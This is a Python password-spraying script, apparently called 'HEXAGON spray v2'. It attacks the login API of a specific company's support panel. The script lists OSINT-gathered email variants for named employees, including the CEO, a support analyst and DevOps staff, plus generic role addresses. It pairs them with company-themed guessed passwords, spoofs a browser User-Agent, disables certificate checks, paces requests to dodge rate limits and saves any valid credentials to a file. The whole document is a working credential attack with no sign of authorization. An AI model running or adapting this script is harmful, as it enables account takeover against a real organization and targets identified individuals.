#!/usr/bin/env python3
"""
HEXAGON spray v2 — Disperso soporte panel
Delay conservador 2.5s para evitar rate limit 429
Prioridad: OSINT emails + top passwords
"""
import requests, time, json, sys
from datetime import datetime
import urllib3
urllib3.disable_warnings()

TARGET = "https://soporte.disperso.com/api/auth/login"

# ---- OSINT emails (alta prioridad — personas reales Tuxpan/Disperso) ----
# Christian Ramirez Pulgar — Analista de SOPORTE (trabaja directamente en Disperso)
# Jonathan Hernandez — Ingeniero de software (jhernandez71 GitHub)
# Patricia Erazo — Gerente General (CEO)
# Sandra Ulloa — Gerente Comercial
# Daniela Canales Urrutia — Lead Qualifier
# Monica Rojas Bustos
# Willians Briones — DevOps
# Esteban Conejeros — Software Architect

OSINT_EMAILS = [
    # Christian Ramirez Pulgar — ANALISTA SOPORTE (MÁXIMA PRIORIDAD)
    "christian.ramirez@disperso.com",
    "christian@disperso.com",
    "cramirez@disperso.com",
    "christian.ramirez@tuxpan.cl",
    "cramirez@tuxpan.cl",
    # Jonathan Hernandez — SW Engineer (GitHub: jhernandez71)
    "jonathan.hernandez@disperso.com",
    "jhernandez@disperso.com",
    "jonathan@disperso.com",
    "jhernandez@tuxpan.cl",
    # Patricia Erazo — CEO
    "patricia.erazo@disperso.com",
    "patricia@disperso.com",
    "perazo@disperso.com",
    "patricia.erazo@tuxpan.cl",
    "perazo@tuxpan.cl",
    # Sandra Ulloa — Comercial
    "sandra.ulloa@disperso.com",
    "sandra@disperso.com",
    "sulloa@disperso.com",
    "sandra.ulloa@tuxpan.cl",
    # Daniela Canales — Lead Qualifier
    "daniela.canales@disperso.com",
    "daniela@disperso.com",
    "dcanales@disperso.com",
    # Monica Rojas
    "monica.rojas@disperso.com",
    "monica@disperso.com",
    "mrojas@disperso.com",
    # Willians Briones — DevOps
    "willians.briones@disperso.com",
    "willians@disperso.com",
    "wbriones@disperso.com",
    # Esteban Conejeros — Arch
    "esteban.conejeros@disperso.com",
    "esteban@disperso.com",
    "econejeros@disperso.com",
]

GENERIC_EMAILS = [
    "admin@disperso.com",
    "soporte@disperso.com",
    "support@disperso.com",
    "help@disperso.com",
    "ops@disperso.com",
    "dev@disperso.com",
    "tech@disperso.com",
    "sales@disperso.com",
    "info@disperso.com",
    "contacto@disperso.com",
    "billing@disperso.com",
    "payments@disperso.com",
    "cto@disperso.com",
    "ceo@disperso.com",
    "hola@disperso.com",
    "api@disperso.com",
    "admin@tuxpan.cl",
    "soporte@tuxpan.cl",
    "dev@tuxpan.cl",
    # Nombres comunes CL
    "carlos@disperso.com", "pedro@disperso.com", "juan@disperso.com",
    "diego@disperso.com", "nicolas@disperso.com", "francisco@disperso.com",
    "felipe@disperso.com", "sebastian@disperso.com", "andres@disperso.com",
    "pablo@disperso.com", "rodrigo@disperso.com", "matias@disperso.com",
    "ignacio@disperso.com", "alejandro@disperso.com", "gabriel@disperso.com",
    "daniel@disperso.com", "jorge@disperso.com", "lucas@disperso.com",
]

# Passwords ordenadas por probabilidad (startup chilena fintech 2024)
PASSWORDS = [
    # Empresa-específicas (MÁS PROBABLE)
    'Disperso2024!', 'Disperso2025!', 'Disperso2026!',
    'Disperso123!', 'Disperso123',
    'Tuxpan2024!', 'Tuxpan2025!', 'Tuxpan123!',
    # Soporte/admin genérico
    'Soporte123!', 'Soporte2024!', 'Support123!',
    'Admin2024!', 'Admin123!', 'admin123',
    # Passwords comunes CL startup
    'Chile2024!', 'Chile2025!',
    'Password1!', 'P@ssw0rd', 'Password123!',
    'Qwerty123!', 'Test1234!', 'Demo2024!',
    'Pagos2024!', 'Pagos2025!',
    # Muy comunes
    'changeme1', 'Welcome1!', 'Temporal123!',
    'Abc12345!', '12345678', 'Primer0!',
]

ALL_EMAILS = OSINT_EMAILS + GENERIC_EMAILS

results = {
    "started": datetime.utcnow().isoformat(),
    "target": TARGET,
    "emails": len(ALL_EMAILS),
    "passwords": len(PASSWORDS),
    "combos": len(ALL_EMAILS) * len(PASSWORDS),
    "tried": 0,
    "hits": [],
    "interesting": [],
    "rate_limits": 0,
    "errors": 0,
}

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, */*",
    "Origin": "https://soporte.disperso.com",
    "Referer": "https://soporte.disperso.com/",
    "Accept-Language": "es-ES,es;q=0.9",
}

DELAY = 2.5   # segundos — conservador para evitar 429
RL_WAIT = 60  # si 429, esperar 60s

print(f"[HEXAGON] Spray v2 iniciado", flush=True)
print(f"[*] Target: {TARGET}", flush=True)
print(f"[*] Emails: {len(ALL_EMAILS)} | Passwords: {len(PASSWORDS)} | Combos: {len(ALL_EMAILS)*len(PASSWORDS)}", flush=True)
print(f"[*] Delay: {DELAY}s | ETA: ~{int(len(ALL_EMAILS)*len(PASSWORDS)*DELAY/60)} min", flush=True)
print("-" * 70, flush=True)

try:
    for email in ALL_EMAILS:
        for pwd in PASSWORDS:
            while True:  # retry loop for rate limit
                try:
                    r = requests.post(
                        TARGET,
                        json={"email": email, "password": pwd},
                        headers=HEADERS,
                        timeout=15,
                        verify=False,
                        allow_redirects=True,
                    )
                    results["tried"] += 1

                    if r.status_code == 200:
                        entry = {
                            "email": email,
                            "password": pwd,
                            "status": r.status_code,
                            "response": r.text[:2000],
                            "ts": datetime.utcnow().isoformat(),
                        }
                        results["hits"].append(entry)
                        print(f"\n[!!!!HIT!!!!] {email}:{pwd} -> {r.status_code}", flush=True)
                        print(f"  Response: {r.text[:500]}", flush=True)
                        # Save immediately
                        with open("/tmp/hexagon_spray_results.json", "w") as f:
                            json.dump(results, f, indent=2)
                    elif r.status_code == 429:
                        results["rate_limits"] += 1
                        retry_after = r.headers.get("Retry-After", str(RL_WAIT))
                        wait_s = int(retry_after) if retry_after.isdigit() else RL_WAIT
                        print(f"[429 RL] Email={email} | Retry-After={retry_after} | Waiting {wait_s}s", flush=True)
                        time.sleep(wait_s)
                        continue  # retry same combo
                    elif r.status_code not in [400, 401, 403, 404]:
                        results["interesting"].append({
                            "email": email, "password": pwd,
                            "status": r.status_code, "response": r.text[:300],
                        })
                        print(f"[?] {email}:{pwd} -> {r.status_code} | {r.text[:80]}", flush=True)
                    else:
                        if results["tried"] % 30 == 0:
                            pct = int(results["tried"] / (len(ALL_EMAILS)*len(PASSWORDS)) * 100)
                            print(f"[.] tried={results['tried']} ({pct}%) | hits={len(results['hits'])} | last={email}", flush=True)

                    break  # no retry needed

                except requests.exceptions.ConnectionError as e:
                    results["errors"] += 1
                    print(f"[ERR-CONN] {str(e)[:80]}", flush=True)
                    time.sleep(5)
                    break
                except Exception as e:
                    results["errors"] += 1
                    print(f"[ERR] {str(e)[:80]}", flush=True)
                    break

            time.sleep(DELAY)

except KeyboardInterrupt:
    print("\n[!] Interrumpido", flush=True)

results["finished"] = datetime.utcnow().isoformat()
print(f"\n[FIN] tried={results['tried']} hits={len(results['hits'])} rl={results['rate_limits']} errors={results['errors']}", flush=True)

with open("/tmp/hexagon_spray_results.json", "w") as f:
    json.dump(results, f, indent=2)
print("[*] Guardado: /tmp/hexagon_spray_results.json", flush=True)

if results["hits"]:
    print("\n[!!!] CREDENCIALES VÁLIDAS:")
    for h in results["hits"]:
        print(f"  {h['email']}:{h['password']}")
else:
    print("[*] Sin hits en esta ronda.")
